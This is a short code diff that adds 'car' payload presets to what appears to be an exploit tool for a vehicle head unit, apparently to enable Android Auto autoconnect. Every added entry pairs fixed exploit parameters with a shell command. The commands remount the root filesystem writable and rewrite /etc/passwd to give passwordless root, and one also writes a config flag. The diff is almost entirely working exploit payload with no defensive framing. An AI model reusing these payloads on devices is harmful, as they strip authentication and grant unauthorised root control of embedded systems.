@@ -39,6 +39,26 @@ PRESETS = {
             'mount -o remount,rw / ; '
             "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
             'sync ; reboot -f'),
+    # car payload variants: same exploit params, only CMD differs (the lab
+    # presets above pin LAB addresses and must never run on the car).
+    # sed: passwordless root on the UART console.
+    'car-sed': (27, 26, 0x8003e7c0,
+                'mount -o remount,rw / ; '
+                "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
+                'sync ; reboot -f'),
+    # cfg: the original goal - AA autoconnect flag (/home/root/cfg), file
+    # takes effect on the next device-add, so no reboot; / goes back ro.
+    'car-cfg': (27, 26, 0x8003e7c0,
+                'mount -o remount,rw / ; '
+                'echo autoconnect=true > /home/root/cfg ; '
+                'sync ; mount -o remount,ro /'),
+    # both: sed + cfg in one shot. Tight fit: ';'-separated without spaces
+    # to stay inside the 145-byte CMD budget.
+    'car-both': (27, 26, 0x8003e7c0,
+                 'mount -o remount,rw /;'
+                 "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd;"
+                 'echo autoconnect=true>/home/root/cfg;'
+                 'sync;reboot -f'),
     # lab-only: car sed command + dump result (mount/reboot make no sense on
     # the lab ramfs; the blob's b . spin blocks init on the 1-cpu VM, so the
     # payload itself must print the file)
